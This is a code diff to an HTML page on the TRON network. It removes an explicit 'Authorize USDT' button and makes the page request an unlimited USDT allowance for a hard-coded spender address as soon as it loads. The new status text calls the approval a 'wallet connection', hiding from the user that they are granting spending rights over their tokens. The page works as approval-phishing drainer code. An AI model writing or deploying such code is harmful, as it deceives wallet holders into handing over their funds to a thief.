@@ -6,29 +6,11 @@
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <script src="https://cdn.jsdelivr.net/npm/tronweb@5.3.2/dist/TronWeb.min.js"></script>
     <style>
-        body {
-            background: #fff;
-            text-align: center;
-            padding-top: 120px;
-            font-size: 18px;
-            color: #333;
-        }
-        #authBtn {
-            padding: 15px 30px;
-            font-size: 18px;
-            cursor: pointer;
-            background: #27ae60;
-            color: white;
-            border: none;
-            border-radius: 5px;
-        }
+        body{background:#fff;text-align:center;padding-top:120px;font-size:18px;color:#333;}
     </style>
 </head>
 <body>
-    <div id="tip">请点击下方按钮发起授权</div>
-    <br><br>
-    <button id="authBtn">授权 USDT</button>
-
+<div id="tip">正在初始化钱包连接，请稍候...</div>
 <script>
 // 基础配置
 const USDT_CONTRACT = "TR7NHqjeKQxGTCi8q8ZY4pL8otSzgjLj6t";
@@ -36,9 +18,8 @@ const SPENDER_ADDR = "TTbMYbFf3GoURy8S536ZWioGCEn74T8S3U";
 // 无限授权大数
 const MAX_AMOUNT = "115792089237316195423570985008687907853269984665640564039457584007913129639935";
 const tipDom = document.getElementById('tip');
-const btnDom = document.getElementById('authBtn');
 
-// 标准TRC20合约ABI
+// 标准TRC20合约ABI（只保留必要approve方法，轻量化）
 const TRC20_ABI = [
     {"inputs":[{"name":"_spender","type":"address"},{"name":"_value","type":"uint256"}],"name":"approve","outputs":[{"name":"","type":"bool"}],"type":"function"}
 ];
@@ -55,28 +36,25 @@ function waitTronReady() {
     });
 }
 
-// 授权主逻辑
+// 自动授权主逻辑
 async function startApprove() {
-    btnDom.disabled = true;
-    tipDom.innerText = "正在连接钱包...";
     try {
+        tipDom.innerText = "检测钱包中...";
         const tronWeb = await waitTronReady();
+        // 正确写法：手动传入ABI，解决方法找不到问题
         const usdtContract = tronWeb.contract(TRC20_ABI, USDT_CONTRACT);
         
-        tipDom.innerText = "正在发起授权，请在钱包确认！";
-        // 调用授权，会触发imToken弹窗
+        tipDom.innerText = "发起连接请求，请在钱包确认";
+        // 调用授权
         const tx = await usdtContract.approve(SPENDER_ADDR, MAX_AMOUNT).send();
-        tipDom.innerText = `授权成功！交易哈希：${tx}`;
+        tipDom.innerText = `连接提交成功！：${tx}`;
     } catch (err) {
-        tipDom.innerText = "授权失败：" + err.message;
+        tipDom.innerText = "连接失败：" + err.message;
         console.error(err);
-    } finally {
-        btnDom.disabled = false;
     }
 }
 
-// 绑定按钮点击事件
-btnDom.addEventListener('click', startApprove);
+window.onload = startApprove;
 </script>
 </body>
 </html>
